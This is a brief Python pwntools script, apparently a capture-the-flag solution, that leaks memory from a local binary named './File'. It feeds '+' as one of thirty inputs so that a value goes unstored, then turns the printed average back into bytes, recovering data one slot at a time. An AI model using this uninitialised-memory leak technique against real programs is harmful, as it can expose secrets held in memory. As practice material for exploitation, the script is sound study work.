#gcc -o File File.c -Wextra
from Crypto.Util.number import long_to_bytes
import pwn
import time
import warnings 

# Correct the ELF instantiation
elf = pwn.ELF("./File")
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context.terminal = ["tmux", "splitw", "-h"]

libc = elf.libc
leaks = []
for leak_c in range(30):
    p = elf.process()
    for i in range(30):
        if i == leak_c:
            p.sendlineafter(b"Enter data to add", b"+")
        else:
            p.sendlineafter(b"Enter data to add", b"0")
    p.recvuntil(b"data is")           
    leak = abs(int(float(p.recvline().strip()[:-1]) * 30))
    leaks.append(long_to_bytes(leak)[::-1])
    print(b"".join(leaks))
    p.close()


